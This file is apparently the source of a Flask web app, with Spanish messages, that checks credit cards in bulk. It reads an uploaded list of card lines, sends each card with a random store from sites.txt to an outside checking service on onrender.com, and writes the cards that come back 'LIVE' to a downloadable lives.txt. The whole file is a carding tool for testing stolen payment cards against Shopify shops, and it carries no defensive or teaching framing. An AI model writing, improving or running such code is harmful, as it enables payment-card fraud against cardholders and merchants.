from flask import Flask, request, render_template, jsonify, send_file
import requests
import os
import random
from threading import Thread

app = Flask(__name__)

SITES_FILE = "sites.txt"
RESULTS = []

def check_cc(cc_line, site):
    url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={site}&cc={cc_line.strip()}"
    try:
        r = requests.get(url, timeout=20)
        if r.status_code == 200:
            try:
                data = r.json()
            except:
                return f"[{cc_line}] ⚠️ Respuesta no válida"
            response = data.get("Response", "").upper()
            if "LIVE" in response:
                with open("lives.txt", "a") as f:
                    f.write(cc_line + "\n")
                return f"[{cc_line}] ✅ LIVE"
            elif "CARD_DECLINED" in response or "DEAD" in response:
                return f"[{cc_line}] ❌ DECLINED"
            else:
                return f"[{cc_line}] ⚠️ {response}"
        else:
            return f"[{cc_line}] ❌ HTTP {r.status_code}"
    except Exception as e:
        return f"[{cc_line}] ⚠️ Error: {e}"

def process_ccs(ccs_lines):
    RESULTS.clear()
    if not os.path.exists(SITES_FILE):
        RESULTS.append("❌ No se encontró sites.txt")
        return
    with open(SITES_FILE, "r") as f:
        sites = [line.strip() for line in f if line.strip()]
    for idx, cc_line in enumerate(ccs_lines, start=1):
        site = random.choice(sites)
        msg = check_cc(cc_line, site)
        RESULTS.append(f"{msg} 📊 Progreso: {idx}/{len(ccs_lines)}")

@app.route("/", methods=["GET", "POST"])
def index():
    return render_template("index.html")

@app.route("/upload", methods=["POST"])
def upload():
    file = request.files.get("ccs_file")
    if file and file.filename.endswith(".txt"):
        ccs_lines = file.read().decode("utf-8").splitlines()
        thread = Thread(target=process_ccs, args=(ccs_lines,))
        thread.start()
        return jsonify({"status": "started"})
    return jsonify({"status": "error", "message": "Sube un archivo .txt válido"})

@app.route("/progress")
def progress():
    return jsonify({"results": RESULTS})

@app.route("/download")
def download():
    if os.path.exists("lives.txt"):
        return send_file("lives.txt", as_attachment=True)
    return "❌ No hay lives.txt disponible."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
